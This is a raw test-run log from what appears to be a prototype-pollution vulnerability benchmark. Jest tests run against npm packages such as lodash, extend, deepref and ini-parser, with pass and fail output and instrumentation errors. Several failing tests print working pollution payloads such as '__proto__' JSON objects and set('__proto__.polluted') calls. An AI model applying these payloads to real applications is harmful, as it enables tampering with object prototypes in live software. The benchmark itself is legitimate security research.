  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'grunt-util-property_0.0.2/grunt-util-property.test.js']' returned non-zero exit status 1.
['../prototype-pollution/ini-parser_0.0.2/ini-parser.test.js']
PASS ini-parser_0.0.2/ini-parser.test.js
  ✓ prototype pollution in ini-parser (43 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.121 s
Ran all test suites matching /ini-parser_0.0.2\/ini-parser.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'parse', 'parseFile', 'parseFileSync' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'parse' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 3, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/deepref_1.1.1/deepref.test.js']
PASS deepref_1.1.1/deepref.test.js
  ✓ prototype pollution in deepref (73 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.163 s
Ran all test suites matching /deepref_1.1.1\/deepref.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'set' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 6\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/lodash_4.17.11/lodash.test.js']
PASS lodash_4.17.11/lodash.test.js
  ✓ prototype pollution in lodash (65 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.145 s
Ran all test suites matching /lodash_4.17.11\/lodash.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'templateSettings', 'after',          'ary',              'assign',\n      'assignIn',         'assignInWith',   'assignWith',       'at',\n      'before',           'bind',           'bindAll',          'bindKey',\n      'castArray',        'chain',          'chunk',            'compact',\n      'concat',           'cond',           'conforms',         'constant',\n      'countBy',          'create',         'curry',            'curryRight',\n      'debounce',         'defaults',       'defaultsDeep',     'defer',\n      'delay',            'difference',     'differenceBy',     'differenceWith',\n      'drop',             'dropRight',      'dropRightWhile',   'dropWhile',\n      'fill',             'filter',         'flatMap',          'flatMapDeep',\n      'flatMapDepth',     'flatten',        'flattenDeep',      'flattenDepth',\n      'flip',             'flow',           'flowRight',        'fromPairs',\n      'functions',        'functionsIn',    'groupBy',          'initial',\n      'intersection',     'intersectionBy', 'intersectionWith', 'invert',\n      'invertBy',         'invokeMap',      'iteratee',         'keyBy',\n      'keys',             'keysIn',         'map',              'mapKeys',\n      'mapValues',        'matches',        'matchesProperty',  'memoize',\n      'merge',            'mergeWith',      'method',           'methodOf',\n      'mixin',            'negate',         'nthArg',           'omit',\n      'omitBy',           'once',           'orderBy',          'over',\n      'overArgs',         'overEvery',      'overSome',         'partial',\n      'partialRight',     'partition',      'pick',             'pickBy',\n      'property',         'propertyOf',     'pull',             'pullAll',\n      'pullAllBy',        'pullAllWith',    'pullAt',           'range',\n      'rangeRight',       'rearg',          'reject',           'remove',\n      ... 209 more items\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'zipObjectDeep' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 7\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/confucious_0.0.12/confucious.test.js']
FAIL confucious_0.0.12/confucious.test.js
  ✕ prototype pollution in confucious (327 ms)

  ● prototype pollution in confucious

    Jest encountered an unexpected token

    This usually means that you are trying to import a file which Jest cannot parse, e.g. it's not plain JavaScript.

    By default, if Jest sees a Babel config, it will use that to transform your files, ignoring "node_modules".

    Here's what you can do:
     • If you are trying to use ECMAScript Modules, see https://jestjs.io/docs/en/ecmascript-modules for how to enable it.
     • To have some of your "node_modules" files transformed, you can specify a custom "transformIgnorePatterns" in your config.
     • If you need a custom transformation specify a "transform" option in your config.
     • If you simply want to mock your non-JS modules (e.g. binary assets) you can stub them out with the "moduleNameMapper" config option.

    You'll find more details and examples of these config options in the docs:
    https://jestjs.io/docs/en/configuration.html

    Details:

    /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/yargs/lib/parser.js:541
        [].concat(aliases[key] || [], key).forEach(function (k) {
         ^

    SyntaxError: Unexpected token ']'

      at Runtime.createScriptFromCode (../node_modules/jest-runtime/build/index.js:1350:14)
      at Object.<anonymous> (node_modules/yargs/index.js:3:14)

  ● prototype pollution in confucious

    TypeError: confucious.set is not a function

      4 | 
      5 |   const confucious = require("confucious");
    > 6 |   confucious.set("__proto__:polluted", "yes");
        |              ^
      7 | 
      8 |   expect({}.polluted).toBe("yes");
      9 | });

      at Object.<anonymous> (confucious_0.0.12/confucious.test.js:6:14)

  ● prototype pollution in confucious

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.402 s
Ran all test suites matching /confucious_0.0.12\/confucious.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'confucious_0.0.12/confucious.test.js']' returned non-zero exit status 1.
['../prototype-pollution/property-expr_2.0.2/property-expr.test.js']
FAIL property-expr_2.0.2/property-expr.test.js
  ✕ prototype pollution in property-expr (89 ms)

  ● prototype pollution in property-expr

    ReferenceError: obj is not defined

      2 | test("prototype pollution in property-expr", () => {
      3 |   let expr = require("property-expr");
    > 4 |   obj = {};
        |      ^
      5 | 
      6 |   expect({}.polluted).toBe(undefined);
      7 | 

      at Object.<anonymous> (property-expr_2.0.2/property-expr.test.js:4:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.258 s
Ran all test suites matching /property-expr_2.0.2\/property-expr.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'property-expr_2.0.2/property-expr.test.js']' returned non-zero exit status 1.
['../prototype-pollution/rfc6902_4.0.2/rfc6902.test.js']
PASS rfc6902_4.0.2/rfc6902.test.js
  ✓ prototype pollution in rfc6902 (204 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.342 s
Ran all test suites matching /rfc6902_4.0.2\/rfc6902.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'applyPatch', 'createPatch', 'createTests' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'applyPatch' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 3, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/ion-parser_0.5.2/ion-parser.test.js']
FAIL ion-parser_0.5.2/ion-parser.test.js
  ✕ prototype pollution in ion-parser (90 ms)

  ● prototype pollution in ion-parser

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/ion-parser/parser.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in ion-parser

    TypeError: ION.parse is not a function

       8 |   expect({}.polluted).toBe(undefined);
       9 | 
    > 10 |   ION.parse(
         |       ^
      11 |     fs.readFileSync(path.resolve(__dirname, "./payload.toml"), "utf-8")
      12 |   );
      13 |   expect({}.polluted).toBe("yes");

      at Object.<anonymous> (ion-parser_0.5.2/ion-parser.test.js:10:7)

  ● prototype pollution in ion-parser

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.291 s
Ran all test suites matching /ion-parser_0.5.2\/ion-parser.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'ion-parser_0.5.2/ion-parser.test.js']' returned non-zero exit status 1.
['../prototype-pollution/keyd_1.3.4/keyd.test.js']
FAIL keyd_1.3.4/keyd.test.js
  ✕ prototype pollution in keyd (45 ms)

  ● prototype pollution in keyd

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/keyd/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in keyd

    TypeError: keyd is not a function

      4 | 
      5 |   const keyd = require("keyd");
    > 6 |   keyd({}).set("__proto__.polluted", "yes"); //payload
        |   ^
      7 | 
      8 |   expect({}.polluted).toBe("yes");
      9 | });

      at Object.<anonymous> (keyd_1.3.4/keyd.test.js:6:3)

  ● prototype pollution in keyd

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.973 s
Ran all test suites matching /keyd_1.3.4\/keyd.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'keyd_1.3.4/keyd.test.js']' returned non-zero exit status 1.
['../prototype-pollution/objutil_2.17.3/objutil.test.js']
FAIL objutil_2.17.3/objutil.test.js
  ✕ prototype pollution in objutil (103 ms)

  ● prototype pollution in objutil

    ReferenceError: result is not defined

       9 |   expect({}.polluted).toBe(undefined);
      10 | 
    > 11 |   result = merge(a, JSON.parse(malicious_payload));
         |         ^
      12 | 
      13 |   expect({}.polluted).toBe("yes");
      14 | });

      at Object.<anonymous> (objutil_2.17.3/objutil.test.js:11:9)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.025 s
Ran all test suites matching /objutil_2.17.3\/objutil.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'objutil_2.17.3/objutil.test.js']' returned non-zero exit status 1.
['../prototype-pollution/prototyped.js_2.0.0/prototyped.test.js']
FAIL prototyped.js_2.0.0/prototyped.test.js
  ✕ prototype pollution in merge-recursive (378 ms)

  ● prototype pollution in merge-recursive

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/prototyped.js/dist/array/sum/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in merge-recursive

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/prototyped.js/dist/utils.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in merge-recursive

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.535 s
Ran all test suites matching /prototyped.js_2.0.0\/prototyped.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'prototyped.js_2.0.0/prototyped.test.js']' returned non-zero exit status 1.
['../prototype-pollution/objtools_3.0.0/objtools.test.js']
FAIL objtools_3.0.0/objtools.test.js
  ✕ prototype pollution in objtools (96 ms)

  ● prototype pollution in objtools

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/objtools/lib/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in objtools

    ReferenceError: obj is not defined

      4 |   const objtools = require("objtools");
      5 |   const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}'); //payload
    > 6 |   obj = {};
        |      ^
      7 | 
      8 |   expect({}.polluted).toBe(undefined);
      9 | 

      at Object.<anonymous> (objtools_3.0.0/objtools.test.js:6:6)

  ● prototype pollution in objtools

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.129 s
Ran all test suites matching /objtools_3.0.0\/objtools.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'objtools_3.0.0/objtools.test.js']' returned non-zero exit status 1.
['../prototype-pollution/simpl-schema_1.10.0/simpl-schema.test.js']
FAIL simpl-schema_1.10.0/simpl-schema.test.js
  ✕ prototype pollution in simpl-schema (917 ms)

  ● prototype pollution in simpl-schema

    TypeError: pushFct(...) is not a function

       6 |   expect({}.polluted).toBe(undefined);
       7 | 
    >  8 |   SimpleSchema.setDefaultMessages(
         |                ^
       9 |     JSON.parse('{"__proto__":{"polluted":"yes"}}')
      10 |   );
      11 |   expect({}.polluted).toBe("yes");

      at Function.setDefaultMessages (node_modules/simpl-schema/dist/SimpleSchema.js:1075:3)
      at Object.<anonymous> (simpl-schema_1.10.0/simpl-schema.test.js:8:16)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.953 s
Ran all test suites matching /simpl-schema_1.10.0\/simpl-schema.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'simpl-schema_1.10.0/simpl-schema.test.js']' returned non-zero exit status 1.
['../prototype-pollution/merge-recursive_0.0.3/merge-recursive.test.js']
FAIL merge-recursive_0.0.3/merge-recursive.test.js
  ✕ prototype pollution in merge-recursive (60 ms)

  ● prototype pollution in merge-recursive

    ReferenceError: obj is not defined

      3 |   const merge = require("merge-recursive").recursive;
      4 |   const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
    > 5 |   obj = {};
        |      ^
      6 | 
      7 |   expect({}.polluted).toBe(undefined);
      8 | 

      at Object.<anonymous> (merge-recursive_0.0.3/merge-recursive.test.js:5:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.088 s
Ran all test suites matching /merge-recursive_0.0.3\/merge-recursive.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'merge-recursive_0.0.3/merge-recursive.test.js']' returned non-zero exit status 1.
['../prototype-pollution/set-getter_0.1.0/set-getter.test.js']
PASS set-getter_0.1.0/set-getter.test.js
  ✓ prototype pollution in set-getter  (102 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.102 s
Ran all test suites matching /set-getter_0.1.0\/set-getter.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 4\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/mathjs_7.4.0/mathjs.test.js']
FAIL mathjs_7.4.0/mathjs.test.js (8.358 s)
  ✕ prototype pollution in mathjs  (7745 ms)

  ● prototype pollution in mathjs 

    TypeError: pushFct(...) is not a function

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at createLazyProxy (node_modules/mathjs/lib/type/chain/Chain.js:134:5)
      at _loop (node_modules/mathjs/lib/type/chain/Chain.js:186:11)
      at Function.createProxy (node_modules/mathjs/lib/type/chain/Chain.js:194:9)
      at Object.<anonymous> (node_modules/mathjs/lib/entry/impureFunctionsAny.generated.js:639:7)
      at Object.<anonymous> (node_modules/mathjs/lib/entry/mainAny.js:66:27)
      at Object.<anonymous> (node_modules/mathjs/main/es5/index.js:1:18)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in mathjs 

    TypeError: mathMod.create is not a function

      2 | test("prototype pollution in mathjs ", () => {
      3 |   var mathMod = require("mathjs");
    > 4 |   const mathjs = mathMod.create(mathMod.all);
        |                          ^
      5 | 
      6 |   expect({}.polluted).toBe(undefined);
      7 | 

      at Object.<anonymous> (mathjs_7.4.0/mathjs.test.js:4:26)

  ● prototype pollution in mathjs 

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        8.78 s
Ran all test suites matching /mathjs_7.4.0\/mathjs.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'mathjs_7.4.0/mathjs.test.js']' returned non-zero exit status 1.
['../prototype-pollution/paypal-adaptive_0.4.1/paypal-adaptive.test.js']
PASS paypal-adaptive_0.4.1/paypal-adaptive.test.js
  ✓ prototype pollution in paypal-adaptive (89 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.12 s
Ran all test suites matching /paypal-adaptive_0.4.1\/paypal-adaptive.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'prototype' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 20, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/nestie_1.0.0/nestie.test.js']
FAIL nestie_1.0.0/nestie.test.js
  ✕ prototype pollution in nestie (41 ms)

  ● prototype pollution in nestie

    ReferenceError: obj is not defined

      2 | test("prototype pollution in nestie", () => {
      3 |   const { nestie } = require("nestie");
    > 4 |   obj = {};
        |      ^
      5 | 
      6 |   expect({}.polluted).toBe(undefined);
      7 | 

      at Object.<anonymous> (nestie_1.0.0/nestie.test.js:4:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.128 s
Ran all test suites matching /nestie_1.0.0\/nestie.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'nestie_1.0.0/nestie.test.js']' returned non-zero exit status 1.
['../prototype-pollution/extend_3.0.1/extend.test.js']
PASS extend_3.0.1/extend.test.js
  ✓ prototype pollution in extend  (60 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.079 s
Ran all test suites matching /extend_3.0.1\/extend.test.js/i.
